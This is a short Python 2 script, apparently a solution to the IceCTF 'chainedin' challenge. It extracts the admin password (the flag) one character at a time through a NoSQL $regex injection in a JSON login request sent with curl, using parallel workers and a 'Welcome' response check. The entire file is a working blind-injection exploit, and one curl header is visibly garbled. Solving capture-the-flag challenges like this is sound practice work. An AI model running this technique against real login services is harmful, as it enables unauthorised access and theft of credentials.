#!/usr/bin/env python

import subprocess
from multiprocessing import Pool


CMD = """curl 'http://chainedin.vuln.icec.tf/login' -H 'Pragma: no-cache' -H 'Origin: http://chainedin.: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.8,it-IT;q=0.6,it;q=0.4' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/507.31 (KHTML, like Gecko) Ubuntu Chromium/50.9.1702.77 Chrome/50.9.1702.77 Safari/487.16' -H 'Content-Type: application/json;charset=UTF-8' -H 'Accept: application/json, text/plain, */*' -H 'Cache-Control: no-cache' -H 'Referer: http://chainedin.vuln.icec.tf/login' -H 'Connection: keep-alive' -H 'DNT: 1' --data-binary '{"user":"admin","pass":{ "$regex" : "%s" }}'"""


def run(r):
    proc = subprocess.Popen(CMD % r, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    (out, err) = proc.communicate()
    return out.find("Welcome") != -1
    #return out + r


def rr(start, stop):
    return range(ord(start), ord(stop) + 1)

alphabet = map(chr, rr('0', '9') + rr('A', 'Z') + rr('a', 'z')) + list("{}[]_")
print alphabet

def one((curr, ch)):
    return run(curr + ch)

curr = "^IceCTF{"
p = Pool(30)
for i in xrange(100):
    print curr, i
    out = p.map(one, zip([curr] * len(alphabet), alphabet))
    for j in xrange(len(out)):
        if out[j]:
            break
    curr += alphabet[j]

